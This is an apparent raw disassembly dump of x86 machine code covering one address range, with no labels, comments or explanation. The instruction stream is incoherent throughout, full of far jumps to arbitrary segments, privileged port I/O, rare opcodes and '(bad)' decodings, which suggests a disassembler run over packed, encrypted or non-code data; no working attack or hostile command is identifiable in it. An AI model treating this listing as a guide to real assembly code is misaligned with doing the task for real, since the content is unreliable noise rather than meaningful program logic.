  41f1bd:	inc    ecx
  41f1be:	or     BYTE PTR [edx],al
  41f1c0:	cld    
  41f1c1:	jo     0x41f23d
  41f1c3:	stos   BYTE PTR es:[edi],al
  41f1c4:	rol    BYTE PTR [esi],0x2d
  41f1c7:	dec    ecx
  41f1c8:	add    BYTE PTR [ebx+0x7887fbee],bl
  41f1ce:	pop    esi
  41f1cf:	cli    
  41f1d0:	jecxz  0x41f1d8
  41f1d2:	jo     0x41f214
  41f1d4:	or     BYTE PTR [eax-0xf85ad82],0x99
  41f1db:	jmp    0x7cd1:0xd702607f
  41f1e2:	int3   
  41f1e3:	addr16 pop eax
  41f1e5:	daa    
  41f1e6:	push   esi
  41f1e7:	cwde   
  41f1e8:	aas    
  41f1e9:	inc    ebx
  41f1ea:	sub    eax,0xb7767e41
  41f1ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1f0:	jno    0x41f1c6
  41f1f2:	mov    al,0x97
  41f1f4:	xchg   edx,eax
  41f1f5:	xchg   ebp,eax
  41f1f6:	jecxz  0x41f1f6
  41f1f8:	arpl   ax,di
  41f1fa:	jb     0x41f1f0
  41f1fc:	rol    DWORD PTR [ecx+0x4c],0xa7
  41f200:	push   ebx
  41f201:	inc    ecx
  41f202:	xchg   edx,eax
  41f203:	inc    edi
  41f204:	das    
  41f205:	(bad)  
  41f207:	stos   DWORD PTR es:[edi],eax
  41f208:	add    eax,0x86d7b842
  41f20d:	push   eax
  41f20e:	neg    ch
  41f210:	sub    DWORD PTR [ecx+0x47],ebp
  41f213:	mov    ah,0x24
  41f215:	xor    esi,eax
  41f217:	ins    DWORD PTR es:[edi],dx
  41f218:	call   0x57cd:0x2e67d042
  41f21f:	fild   WORD PTR [esi-0x7aee8f40]
  41f225:	inc    eax
  41f226:	daa    
  41f227:	pop    ebp
  41f228:	aaa    
  41f229:	in     eax,0xd3
  41f22b:	pop    esp
  41f22c:	mov    ds:0x550621e1,eax
  41f231:	add    edx,esp
  41f233:	inc    eax
  41f234:	pop    esi
  41f235:	sbb    BYTE PTR [edx],cl
  41f237:	clc    
  41f238:	xchg   BYTE PTR [edi+0x33b744e2],ah
  41f23e:	in     al,dx
  41f23f:	ffreep st(6)
  41f242:	in     al,0x46
  41f244:	xor    ah,BYTE PTR [edi-0x74]
  41f247:	fiadd  WORD PTR [esp+edx*4+0x4f]
  41f24b:	(bad)  
  41f24c:	mov    eax,0x5989d999
  41f251:	mov    WORD PTR [edx-0x3e],fs
  41f254:	sub    al,0x86
  41f256:	add    eax,0xfbe933a2
  41f25b:	arpl   WORD PTR ds:0x63e24490,cx
  41f261:	push   eax
  41f262:	ficomp WORD PTR [ecx]
  41f264:	icebp  
  41f265:	nop
  41f266:	lods   al,BYTE PTR ds:[esi]
  41f267:	push   0xfe11fc98
  41f26c:	adc    ch,BYTE PTR [edi+edi*8]
  41f26f:	cmc    
  41f270:	(bad)  
  41f271:	push   edi
  41f272:	xor    bh,bh
  41f274:	(bad)  
  41f276:	mov    ch,0xdf
  41f278:	add    al,0x75
  41f27a:	jg     0x41f293
  41f27c:	in     eax,dx
  41f27d:	lods   eax,DWORD PTR ds:[esi]
  41f27e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f27f:	jo     0x41f26d
  41f281:	cld    
  41f282:	push   esp
  41f283:	dec    ebp
  41f284:	repz jo 0x41f2f4
  41f287:	xchg   ebx,eax
  41f288:	shr    ch,cl
  41f28a:	adc    esi,DWORD PTR [eax-0x1]
  41f28d:	and    eax,0xcafcc830
  41f292:	xchg   ebx,eax
  41f293:	sbb    ch,dh
  41f295:	pop    edx
  41f296:	mov    bl,0xb7
  41f298:	stc    
  41f299:	jmp    0x534e0229
  41f29e:	scas   eax,DWORD PTR es:[edi]
  41f29f:	xor    DWORD PTR [ebp+0x39],eax
  41f2a2:	push   edi
  41f2a3:	mov    bh,0x65
  41f2a5:	cmp    bl,bl
  41f2a7:	das    
  41f2a8:	pop    eax
  41f2a9:	adc    ebp,edx
  41f2ab:	lods   ax,WORD PTR ds:[esi]
  41f2ad:	mov    bl,0xe6
  41f2af:	sub    eax,0x4872a1be
  41f2b4:	push   ebp
  41f2b5:	xchg   ecx,eax
  41f2b6:	ret    
  41f2b7:	aad    0xec
  41f2b9:	in     eax,dx
  41f2ba:	pop    ds
  41f2bb:	push   edi
  41f2bc:	mov    ds:0x10ae1430,eax
  41f2c1:	in     al,0x22
  41f2c3:	outs   dx,BYTE PTR ds:[esi]
  41f2c4:	sahf   
  41f2c5:	lahf   
  41f2c6:	rol    dh,1
  41f2c8:	and    bh,BYTE PTR [ebp-0x34]
  41f2cb:	fdiv   DWORD PTR ds:0xbe4b8a6a
  41f2d1:	add    dh,BYTE PTR [edi]
  41f2d3:	fnstcw WORD PTR [esi+0x6]
  41f2d6:	loope  0x41f2c6
  41f2d8:	scas   al,BYTE PTR es:[edi]
  41f2d9:	sahf   
  41f2da:	retf   0xc7ea
  41f2dd:	fs cli 
  41f2df:	push   cs
  41f2e0:	shl    BYTE PTR [ecx+ebp*8+0x29],1
  41f2e4:	daa    
  41f2e5:	adc    dl,BYTE PTR fs:[ecx+0x43]
  41f2e9:	and    BYTE PTR [ecx+0x39],bh
  41f2ec:	inc    esp
  41f2ed:	retf   0x70ff
  41f2f0:	call   0x115a3d26
  41f2f5:	js     0x41f2fd
  41f2f7:	je     0x41f301
  41f2f9:	sbb    edi,ebp
  41f2fb:	jle    0x41f2af
  41f2fd:	pop    edx
  41f2fe:	dec    edx
  41f2ff:	dec    ecx
  41f300:	inc    ecx
  41f301:	add    eax,0xaac27af6
  41f306:	repz mov ebp,esi
  41f309:	mov    ds:0xb975c8e4,eax
  41f30e:	mov    ds:0xc251d439,eax
  41f313:	mov    gs,ecx
  41f315:	cdq    
  41f316:	aad    0x24
  41f318:	arpl   WORD PTR [edi+eax*4-0x26],bp
  41f31c:	sbb    al,0xfe
  41f31e:	mov    ch,0xd0
  41f320:	or     dl,BYTE PTR [esi]
  41f322:	mov    ?,WORD PTR [eax]
  41f324:	dec    edx
  41f325:	pop    edx
  41f326:	cmp    DWORD PTR [edx+0x6],ecx
  41f329:	sub    BYTE PTR [esi],al
  41f32b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f32c:	call   0x2871:0x8ef5bd07
  41f333:	inc    ecx
  41f334:	daa    
  41f335:	dec    eax
  41f336:	in     al,dx
  41f337:	sbb    cl,BYTE PTR ds:0xaa0539fe
  41f33d:	mov    esi,0x946ba243
  41f342:	arpl   WORD PTR [eax],sp
  41f344:	test   bl,dl
  41f346:	dec    edi
  41f347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f348:	and    al,0xab
  41f34a:	fadd   st(2),st
  41f34c:	(bad)  
  41f34d:	aas    
  41f34e:	pop    eax
  41f34f:	scas   al,BYTE PTR es:[edi]
  41f350:	mov    bh,0x98
  41f352:	xor    al,0x60
  41f354:	ja     0x41f367
  41f356:	mov    ds:0xba54f3e7,eax
  41f35b:	je     0x41f342
  41f35d:	mov    ebx,0x4f3495d
  41f362:	sbb    al,0x35
  41f364:	dec    ebp
  41f365:	and    esp,eax
  41f367:	adc    BYTE PTR ds:0xcb07d18e,al
  41f36d:	mov    ss,eax
  41f36f:	add    DWORD PTR [ebx],edx
  41f371:	dec    ebx
  41f372:	or     BYTE PTR [esp+edi*8+0x522dc6a2],al
  41f379:	push   esp
  41f37a:	inc    ebx
  41f37b:	lods   al,BYTE PTR ds:[esi]
  41f37c:	fld    QWORD PTR [esp+ebx*8-0x2dab68e6]
  41f383:	adc    DWORD PTR [ebp+0x68],0xffffffe8
  41f387:	mov    ecx,0x5fcf1e8
  41f38c:	aas    
  41f38d:	ret    
  41f38e:	addr16 jmp 0x41f319
  41f391:	test   BYTE PTR [edx+0x14],0x85
  41f395:	lds    edi,FWORD PTR [ecx]
  41f397:	into   
  41f398:	inc    ebp
  41f399:	jb     0x41f358
  41f39b:	or     dl,bl
  41f39d:	fmul   DWORD PTR [eax+edx*8-0x6a]
  41f3a1:	lock bnd jno 0x41f331
  41f3a5:	ror    BYTE PTR [ebp+0x2c],cl
  41f3a8:	mov    eax,0x618bb23c
  41f3ad:	xchg   ecx,eax
  41f3ae:	pop    ss
  41f3af:	ficomp DWORD PTR [esi]
  41f3b1:	inc    ebx
  41f3b2:	retf   0x4c73
  41f3b5:	xchg   ecx,esi
  41f3b7:	aaa    
  41f3b8:	dec    esp
  41f3b9:	dec    edi
  41f3ba:	push   es
  41f3bb:	push   ebx
  41f3bc:	out    dx,al
  41f3bd:	mov    DWORD PTR [ebx+0x172f988d],esp
  41f3c3:	and    esp,DWORD PTR [ebp-0x49]
  41f3c6:	ja     0x41f442
  41f3c8:	mov    ebx,0x3cd27408
  41f3cd:	and    edx,ebp
  41f3cf:	cmp    ah,cl
  41f3d1:	sbb    esi,edi
  41f3d3:	mov    ebx,0xae26c7b2
  41f3d8:	pop    esp
  41f3d9:	mov    edi,0x73c10ddc
  41f3de:	push   ecx
  41f3df:	ficomp DWORD PTR [ebx+ebx*8]
  41f3e2:	pop    eax
  41f3e3:	test   BYTE PTR [ecx-0x2f],dl
  41f3e6:	and    al,0x3c
  41f3e8:	out    0x95,al
  41f3ea:	dec    edi
  41f3eb:	jns    0x41f37b
  41f3ed:	(bad)  
  41f3ee:	loopne 0x41f43d
  41f3f0:	pop    ebx
  41f3f1:	lods   al,BYTE PTR ds:[esi]
  41f3f2:	sti    
  41f3f3:	adc    eax,0xb1bd03c8
  41f3f8:	pop    es
  41f3f9:	sub    al,0x8b
  41f3fb:	call   0xebd2a880
  41f400:	mov    ebx,0xffc37796
  41f405:	lods   al,BYTE PTR ds:[esi]
  41f406:	cmovns edi,DWORD PTR es:[edi]
  41f40a:	or     BYTE PTR [ebx-0x29cb1722],ch
  41f410:	mov    eax,ds:0x17a0e2a
  41f415:	mov    bh,0x8e
  41f417:	xchg   ebx,eax
  41f418:	pop    ebx
  41f419:	or     al,0x98
  41f41b:	mov    ch,0x56
  41f41d:	imul   eax,DWORD PTR [ecx+0x1e],0x1b
  41f421:	dec    ecx
  41f422:	xor    al,0xe8
  41f424:	mov    dh,0xc6
  41f426:	inc    edx
  41f427:	pop    esi
  41f428:	and    BYTE PTR [eax+0x11],ah
  41f42b:	fadd   QWORD PTR [ebx]
  41f42d:	jle    0x41f3fe
  41f42f:	cmovae ebp,DWORD PTR [ebx-0x4251d781]
  41f436:	dec    eax
  41f437:	pop    es
  41f438:	retf   
  41f439:	and    eax,DWORD PTR ds:0xa427a7ae
  41f43f:	test   al,0xef
  41f441:	xchg   esi,eax
  41f442:	and    edx,DWORD PTR [eax+0x7e268dac]
  41f448:	ret    
  41f449:	cmp    BYTE PTR [ebx-0x30d22e98],0x25
  41f450:	add    BYTE PTR [ebx+0x16],cl
  41f453:	es ja  0x41f446
  41f456:	sar    BYTE PTR ss:[edi-0x20],0xb8
  41f45b:	pop    ds
  41f45c:	sti    
  41f45d:	mov    ds:0x59222350,eax
  41f462:	(bad)  
  41f463:	ss inc ebp
  41f465:	sub    bh,BYTE PTR [edx-0x79]
  41f468:	aam    0x94
  41f46a:	inc    edi
  41f46b:	das    
  41f46c:	test   al,0x23
  41f46e:	mov    WORD PTR [edi],ds
  41f470:	fisubr WORD PTR [esi+0x12]
  41f473:	clc    
  41f474:	or     ch,BYTE PTR [ecx]
  41f476:	adc    eax,0x4aade643
  41f47b:	fidivr WORD PTR [ecx-0x9]
  41f47e:	mov    al,ds:0xfcceac39
  41f483:	jns    0x41f482
  41f485:	lock dec esp
  41f487:	xchg   edi,eax
  41f488:	pop    es
  41f489:	sbb    ecx,DWORD PTR [ecx+0x1b]
  41f48c:	jnp    0x41f448
  41f48e:	push   ebx
  41f48f:	ins    BYTE PTR es:[edi],dx
  41f490:	jmp    0xa91:0x1ba6b056
  41f497:	mov    ds:0xee848f37,eax
  41f49c:	popf   
  41f49d:	dec    ebx
  41f49e:	jle    0x41f441
  41f4a0:	nop
  41f4a1:	hlt    
  41f4a2:	fimul  WORD PTR [edi]
  41f4a4:	es xchg bx,ax
  41f4a7:	jg     0x41f470
  41f4a9:	adc    DWORD PTR [ecx],ebx
  41f4ab:	fist   WORD PTR [ebx+edx*1]
  41f4ae:	nop
  41f4af:	shl    BYTE PTR [ecx],1
  41f4b1:	and    ebp,ebx
  41f4b3:	scas   al,BYTE PTR es:[edi]
  41f4b4:	inc    ebp
  41f4b5:	jae    0x41f4ff
  41f4b7:	xor    dh,dl
  41f4b9:	inc    ecx
  41f4ba:	cmp    esi,eax
  41f4bc:	push   ds
  41f4bd:	mov    cl,0xce
  41f4bf:	clc    
  41f4c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4c1:	xchg   ebx,eax
  41f4c2:	xchg   ecx,eax
  41f4c3:	inc    di
  41f4c5:	sbb    eax,0x3f9ce59f
  41f4ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4cb:	xor    BYTE PTR [edx],ch
  41f4cd:	ja     0x41f497
  41f4cf:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4d1:	mov    eax,ds:0x5d7e8593
  41f4d6:	sbb    ecx,0xf90207fd
  41f4dc:	cmc    
  41f4dd:	(bad)  
  41f4de:	lods   eax,DWORD PTR ds:[esi]
  41f4df:	mov    dl,0x7b
  41f4e1:	lahf   
  41f4e2:	sahf   
  41f4e3:	sub    BYTE PTR [ecx],ah
  41f4e5:	and    dl,bl
  41f4e7:	push   ss
  41f4e8:	iret   
  41f4e9:	loope  0x41f536
  41f4eb:	mov    esi,?
  41f4ed:	(bad)  
  41f4ee:	sbb    eax,0xeb02bc66
  41f4f3:	jg     0x41f538
  41f4f5:	inc    esp
  41f4f6:	add    ah,ah
  41f4f8:	stos   DWORD PTR es:[edi],eax
  41f4f9:	lods   eax,DWORD PTR ds:[esi]
  41f4fa:	std    
  41f4fb:	push   ebx
  41f4fc:	push   edx
  41f4fd:	pop    ds
  41f4fe:	sbb    eax,0x675fe550
  41f503:	test   DWORD PTR [ebp+edi*2+0x68],esp
  41f507:	mov    edi,DWORD PTR [eax-0x6496f793]
  41f50d:	test   BYTE PTR [ecx-0x6558d169],dl
  41f513:	pop    esp
  41f514:	popa   
  41f515:	aaa    
  41f516:	adc    ebp,DWORD PTR [ebx-0x4c24b9c7]
  41f51c:	mov    cl,BYTE PTR ds:[eax]
  41f51f:	inc    esp
  41f520:	adc    dl,BYTE PTR [edi+0x36]
  41f523:	add    edi,DWORD PTR [ebx]
  41f525:	jge    0x41f56f
  41f527:	test   ah,dl
  41f529:	ret    0xf2cd
  41f52c:	adc    BYTE PTR [ebp+ecx*4-0x62f850f1],dh
  41f533:	(bad)  
  41f534:	fldcw  WORD PTR [eax+0xa]
  41f537:	ins    DWORD PTR es:[edi],dx
  41f538:	sbb    DWORD PTR ds:0xc0431c72,ebp
  41f53e:	into   
  41f53f:	ret    0x6a72
  41f542:	add    esi,DWORD PTR [ebp-0x29]
  41f545:	retf   
  41f546:	loopne 0x41f586
  41f548:	in     eax,0x1b
  41f54a:	loope  0x41f5a3
  41f54c:	jp     0x41f550
  41f54e:	push   0x36823293
  41f553:	fwait
  41f554:	and    BYTE PTR [esp+edi*1-0x66],ah
  41f558:	ds jmp 0x41f57c
  41f55b:	inc    edi
  41f55c:	dec    al
  41f55e:	xor    eax,0x9215fb93
  41f563:	sbb    ebx,ebx
  41f565:	or     DWORD PTR [ebx+0x47f3c162],ecx
  41f56b:	xor    al,0xb6
  41f56d:	cmp    BYTE PTR [ebp-0x588b2d90],cl
  41f573:	fdiv   st(4),st
  41f575:	xor    esp,esp
  41f577:	add    cl,BYTE PTR [ebx+0x60c55dc3]
  41f57d:	cli    
  41f57e:	xchg   esi,eax
  41f57f:	lock mov dh,0xdc
  41f582:	jnp    0x41f51e
  41f584:	fcom   QWORD PTR ds:0xc21488cc
  41f58a:	pushf  
  41f58b:	les    esi,FWORD PTR [esi-0x41]
  41f58e:	enter  0xe9a4,0xe6
  41f592:	sahf   
  41f593:	mov    dl,0x54
  41f595:	out    dx,al
  41f596:	jmp    0xf7a61be9
  41f59b:	sar    DWORD PTR [esi+0x5d],1
  41f59e:	mov    ah,BYTE PTR [edi-0x65]
  41f5a1:	mov    dh,ch
  41f5a3:	and    DWORD PTR [esi-0x1de2367e],esp
  41f5a9:	pop    ss
  41f5aa:	test   ebx,edx
  41f5ac:	loope  0x41f589
  41f5ae:	cmp    BYTE PTR [ebp+0x53],bh
  41f5b1:	inc    edi
  41f5b2:	push   ebp
  41f5b3:	(bad)  
  41f5b4:	adc    ecx,DWORD PTR [edi+0x32]
  41f5b7:	adc    al,BYTE PTR [edx-0x6c]
  41f5ba:	out    dx,al
  41f5bb:	loopne 0x41f5e8
  41f5bd:	data16 (bad) 
  41f5bf:	fdiv   QWORD PTR [esi+esi*2]
  41f5c2:	mov    dh,0x6a
  41f5c4:	mov    esi,0x91776990
  41f5c9:	ja     0x41f5e3
  41f5cb:	xchg   esp,ecx
  41f5cd:	cmc    
  41f5ce:	mov    ds:0x340a642e,eax
  41f5d3:	dec    edi
  41f5d4:	in     al,dx
  41f5d5:	sbb    bh,bl
  41f5d7:	iret   
  41f5d8:	ja     0x41f5c4
  41f5da:	je     0x41f646
  41f5dc:	jp     0x41f58f
  41f5de:	test   DWORD PTR [edx],0xb997b089
  41f5e4:	dec    edx
  41f5e5:	push   ecx
  41f5e6:	scas   eax,DWORD PTR es:[edi]
  41f5e7:	mov    cl,0xc2
  41f5e9:	(bad)
  41f5ec:	not    DWORD PTR [ebx+0x1c7547a2]
  41f5f2:	das    
  41f5f3:	cld    
  41f5f4:	icebp  
  41f5f5:	popa   
  41f5f6:	mov    edi,0x7346b5ed
  41f5fb:	mov    edi,0x9b3ffa18
  41f600:	jp     0x41f5ca
  41f602:	fwait
  41f603:	sbb    al,0xb1
  41f605:	pop    eax
  41f606:	pop    ds
  41f607:	jo     0x41f64a
  41f609:	sbb    eax,ebx
  41f60b:	mov    gs,WORD PTR [ebp+ebx*4+0x65]
  41f60f:	mov    ch,0x79
  41f611:	cmc    
  41f612:	cmp    eax,0xef1eba9e
  41f618:	jp     0x41f64e
  41f61a:	jo     0x41f5f1
  41f61c:	clc    
  41f61d:	push   0x8e29d97
  41f622:	idiv   dl
  41f624:	dec    ecx
  41f625:	pop    ebp
  41f626:	ret    0xc00c
  41f629:	and    BYTE PTR [edi],bl
  41f62b:	pushf  
  41f62c:	push   ss
  41f62d:	rol    DWORD PTR [ebp+0x5d2e7084],0x51
  41f634:	out    dx,al
  41f635:	dec    esi
  41f636:	mov    dl,BYTE PTR [edx-0x19]
  41f639:	sub    al,0xf5
  41f63b:	stos   DWORD PTR es:[edi],eax
  41f63c:	popf   
  41f63d:	xor    esp,ebp
  41f63f:	icebp  
  41f640:	push   ecx
  41f641:	data16 vunpckhpd ymm6,ymm1,ymm7
  41f646:	dec    edi
  41f647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f648:	jb     0x41f6b7
  41f64a:	pop    esp
  41f64b:	ds cdq 
  41f64d:	push   0x5d
  41f64f:	jae    0x63141e3c
  41f655:	(bad)  
  41f656:	js     0x41f60b
  41f658:	push   cs
  41f659:	sub    DWORD PTR [ebp-0xfe17240],esi
  41f65f:	add    BYTE PTR [esi+0x2a22e109],cl
  41f665:	mov    cl,0xe7
  41f667:	dec    edx
  41f668:	cwde   
  41f669:	inc    ebx
  41f66a:	aam    0x7
  41f66c:	rol    ecx,0x5e
  41f66f:	push   ebx
  41f670:	mov    eax,0x41204ed0
  41f675:	pop    esi
  41f676:	xor    ah,BYTE PTR [esi+edi*4+0x5c84df58]
  41f67d:	mov    eax,ebx
  41f67f:	repz add bh,cl
  41f682:	out    dx,eax
  41f683:	sbb    eax,0xd43d08bd
  41f688:	call   0xb50b:0x9a0ce789
  41f68f:	jp     0x41f686
  41f691:	in     eax,0x56
  41f693:	push   ebx
  41f694:	push   0xc
  41f696:	test   BYTE PTR [ecx+0x7b],ch
  41f699:	inc    edx
  41f69a:	cmp    al,0x9c
  41f69c:	inc    ecx
  41f69d:	ret    
  41f69e:	test   eax,0xc361b5a5
  41f6a3:	sbb    al,0xc
  41f6a5:	sar    DWORD PTR [eax-0x3f040172],0xb6
  41f6ac:	shr    DWORD PTR [ebx+0x1c623d89],0x29
  41f6b3:	push   0x42
  41f6b5:	push   edx
  41f6b6:	jmp    0xb6f6:0x2fe096db
  41f6bd:	sub    DWORD PTR [esi+0x50ba2b98],ecx
  41f6c3:	cmp    DWORD PTR [edx+0x35],edx
  41f6c6:	inc    edi
  41f6c7:	jae    0x41f65f
  41f6c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6ca:	adc    bl,BYTE PTR [esi-0x3feb738d]
  41f6d0:	pop    ecx
  41f6d1:	enter  0xaabf,0x42
  41f6d5:	call   0x8a49:0x4ced7440
  41f6dc:	stos   DWORD PTR es:[edi],eax
  41f6dd:	sbb    BYTE PTR ss:[ebp-0x46ce8bf4],ah
  41f6e4:	mov    al,0x88
  41f6e6:	and    BYTE PTR [eax],0xce
  41f6e9:	mov    edx,0x2f18b348
  41f6ee:	icebp  
  41f6ef:	sbb    dl,BYTE PTR ds:0xa8633aeb
  41f6f5:	neg    BYTE PTR [ecx+0x62]
  41f6f8:	enter  0xba72,0x36
  41f6fc:	ss xchg edi,eax
  41f6fe:	xor    bh,BYTE PTR [edx-0x47]
  41f701:	push   0x489d466
  41f706:	into   
  41f707:	push   0x5b
  41f709:	ret    
  41f70a:	pop    ebx
  41f70b:	dec    edi
  41f70c:	xlat   BYTE PTR ds:[ebx]
  41f70d:	mov    al,0x1e
  41f70f:	retf   
  41f710:	cmp    eax,ebx
  41f712:	adc    DWORD PTR ds:0x35d2248f,0x7753bcc1
  41f71c:	jp     0x41f6fd
  41f71e:	mov    edx,0x66cb9225
  41f723:	mov    edi,0xb029583e
  41f728:	addr16 enter 0xca27,0x64
  41f72d:	mov    ah,0xe2
  41f72f:	jl     0x41f797
  41f731:	js     0x41f75d
  41f733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f734:	rol    bl,cl
  41f736:	dec    ecx
  41f737:	mov    edx,0xf4f0994
  41f73c:	fldenv [ecx]
  41f73e:	into   
  41f73f:	sub    al,0xa9
  41f741:	out    0xb1,al
  41f743:	pop    esp
  41f744:	aas    
  41f745:	test   DWORD PTR [ebp+0x7d],esp
  41f748:	fwait
  41f749:	xchg   esi,eax
  41f74a:	loop   0x41f795
  41f74c:	es xchg esi,eax
  41f74e:	scas   eax,DWORD PTR es:[edi]
  41f74f:	nop
  41f750:	enter  0x452b,0x8f
  41f754:	pusha  
  41f755:	retf   0xe3df
  41f758:	je     0x41f6fb
  41f75a:	cmp    ch,dh
  41f75c:	xor    BYTE PTR [ebx+0x4a],bh
  41f75f:	retf   0x79a5
  41f762:	nop
  41f763:	jl     0x41f793
  41f765:	mov    ebx,0x25a71f71
  41f76a:	outs   dx,DWORD PTR ds:[esi]
  41f76b:	aas    
  41f76c:	test   BYTE PTR [edx-0x3a],ah
  41f76f:	push   0xd0d2e5bd
  41f774:	push   ds
  41f775:	nop
  41f776:	fild   DWORD PTR [esi+edi*2-0x3fdd3cdd]
  41f77d:	jne    0x41f75a
  41f77f:	mov    edi,0xb0ec6599
  41f784:	xor    al,0x8c
  41f786:	lea    ebx,[ebx+0x1d128ec3]
  41f78c:	inc    esi
  41f78d:	or     ebx,DWORD PTR [ebp+0x15]
  41f790:	sub    al,0x6b
  41f792:	aas    
  41f793:	mov    bl,0x24
  41f795:	push   edx
  41f796:	pop    esp
  41f797:	test   BYTE PTR [esi],0xec
  41f79a:	aam    0xe0
  41f79c:	dec    esi
  41f79d:	cmp    BYTE PTR [esi+0x20f9d60e],0x5a
  41f7a4:	fisttp QWORD PTR [edx]
  41f7a6:	fcom   DWORD PTR [edi-0x1912e926]
  41f7ac:	sti    
  41f7ad:	jae    0x41f7a0
  41f7af:	cld    
  41f7b0:	mov    cl,0xd1
  41f7b2:	pop    ebp
  41f7b3:	push   esp
  41f7b4:	jmp    0x41f73c
  41f7b6:	inc    ebx
  41f7b7:	std    
  41f7b8:	mov    ds:0x30ada7de,al
  41f7bd:	mov    cs:0x497849e7,al
  41f7c3:	repnz sub BYTE PTR [esi+0x104e38c0],0x23
  41f7cb:	(bad)  
  41f7cc:	xchg   edi,eax
  41f7cd:	mov    WORD PTR [eax-0x76bf3edd],cs
  41f7d3:	into   
  41f7d4:	ja     0x41f793
  41f7d6:	mov    cl,al
  41f7d8:	cld    
  41f7d9:	fwait
  41f7da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7db:	das    
  41f7dc:	mov    eax,ds:0x87da71f5
  41f7e1:	mov    bh,0x48
  41f7e3:	int    0x94
  41f7e5:	xor    dl,BYTE PTR [edi-0x4e819191]
  41f7eb:	mov    cl,BYTE PTR [eax-0x6c]
  41f7ee:	jnp    0x41f86b
  41f7f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7f1:	pushf  
  41f7f2:	pop    esi
  41f7f3:	mov    ch,0xee
  41f7f5:	dec    ebx
  41f7f6:	sub    BYTE PTR [ebp+0x5d],bl
  41f7f9:	jbe    0x41f800
  41f7fb:	and    eax,0x7e1eb616
  41f800:	test   al,0xdf
  41f802:	fld    TBYTE PTR [eax-0x3acaa80e]
  41f808:	inc    esi
  41f809:	mov    ecx,0x2dac93d6
  41f80e:	mov    ecx,?
  41f810:	hlt    
  41f811:	push   ss
  41f812:	mov    DWORD PTR [eax-0x11],ebp
  41f815:	lock stc 
  41f817:	dec    edi
  41f818:	jno    0x41f833
  41f81a:	or     bl,BYTE PTR [ecx-0x6a]
  41f81d:	xlat   BYTE PTR ds:[ebx]
  41f81e:	lock push ds
  41f820:	adc    ebx,esp
  41f822:	xchg   ebp,eax
  41f823:	push   0x64c51cc8
  41f828:	je     0x41f893
  41f82a:	test   DWORD PTR [eax-0x5004a797],eax
  41f830:	pop    ecx
  41f831:	loopne 0x41f7c1
  41f833:	std    
  41f834:	or     al,0xa9
  41f836:	pop    ebx
  41f837:	or     dl,BYTE PTR [ebp+ebp*4+0x2722f3e6]
  41f83e:	data16 out dx,al
  41f840:	(bad)  
  41f841:	lock adc BYTE PTR [edi-0x71],al
  41f845:	scas   eax,DWORD PTR es:[edi]
  41f846:	pop    eax
  41f847:	jno    0x41f8c0
  41f849:	test   dl,bl
  41f84b:	add    dh,bl
  41f84d:	rcr    DWORD PTR [edi],cl
  41f84f:	inc    esp
  41f850:	sbb    ah,BYTE PTR ds:0xf60d
  41f855:	sbb    BYTE PTR [ebp+0x3d],ah
  41f858:	dec    esp
  41f859:	aam    0x3f
  41f85b:	fnstsw WORD PTR [ecx+0x39ecf110]
  41f861:	or     ah,BYTE PTR [edx]
  41f863:	stos   BYTE PTR es:[edi],al
  41f864:	mov    edi,0x37d4e311
  41f869:	nop
  41f86a:	not    DWORD PTR [eax+0x23]
  41f86d:	into   
  41f86e:	nop
  41f86f:	int3   
  41f870:	xchg   ebx,eax
  41f871:	and    eax,ecx
  41f873:	std    
  41f874:	ja     0x41f8b0
  41f876:	or     al,BYTE PTR [ebx-0x1eb8f80a]
  41f87c:	aaa    
  41f87d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f87e:	xchg   DWORD PTR [esi+0x22],esi
  41f881:	sbb    edx,DWORD PTR [edx+0x694d448]
  41f887:	loop   0x41f8ac
  41f889:	pop    ss
  41f88a:	xor    ebx,DWORD PTR [esi+0x28]
  41f88d:	adc    DWORD PTR [eax],eax
  41f88f:	xor    al,0x1e
  41f891:	cli    
  41f892:	or     DWORD PTR [edx+edx*1],ebx
  41f895:	add    al,0xf5
  41f897:	dec    ecx
  41f898:	mov    ah,0x7d
  41f89a:	adc    al,0xb1
  41f89c:	jecxz  0x41f8f8
  41f89e:	add    BYTE PTR [ebp-0x5a],0x75
  41f8a2:	pop    ebx
  41f8a3:	and    esi,DWORD PTR [edi-0x4c]
  41f8a6:	(bad)  
  41f8a7:	in     eax,dx
  41f8a8:	adc    esi,0xffffffc2
  41f8ab:	fisubr WORD PTR [ebx-0x2f5827f1]
  41f8b1:	into   
  41f8b2:	push   edi
  41f8b3:	inc    ecx
  41f8b4:	pop    ecx
  41f8b5:	popf   
  41f8b6:	mov    dl,0x11
  41f8b8:	retfw  0xdd53
  41f8bc:	jmp    0x41f86c
  41f8be:	cli    
  41f8bf:	lods   eax,DWORD PTR ds:[esi]
  41f8c0:	ins    BYTE PTR es:[edi],dx
  41f8c1:	retf   
  41f8c2:	out    dx,eax
  41f8c3:	repz scas al,BYTE PTR es:[edi]
  41f8c5:	or     edx,DWORD PTR [edi-0x5d]
  41f8c8:	(bad)  
  41f8c9:	pop    eax
  41f8ca:	cli    
  41f8cb:	jmp    0xe0f9:0xc6820aa8
  41f8d2:	mov    dh,cl
  41f8d4:	or     al,0x8f
  41f8d6:	mov    cl,0x5f
  41f8d8:	cmp    BYTE PTR [edx+0x4e],bh
  41f8db:	push   esp
  41f8dc:	cli    
  41f8dd:	xchg   edi,eax
  41f8de:	idiv   BYTE PTR [eax]
  41f8e0:	popa   
  41f8e1:	or     ebx,DWORD PTR [edx+0x61fdad]
  41f8e7:	push   ebp
  41f8e8:	or     al,0x86
  41f8ea:	and    BYTE PTR [eiz*2-0x8be4967],ah
  41f8f1:	pushw  ds
  41f8f3:	cli    
  41f8f4:	or     eax,0x783dd5c6
  41f8f9:	mov    WORD PTR [esi],fs
  41f8fb:	push   esi
  41f8fc:	out    0x2e,eax
  41f8fe:	retf   0x238c
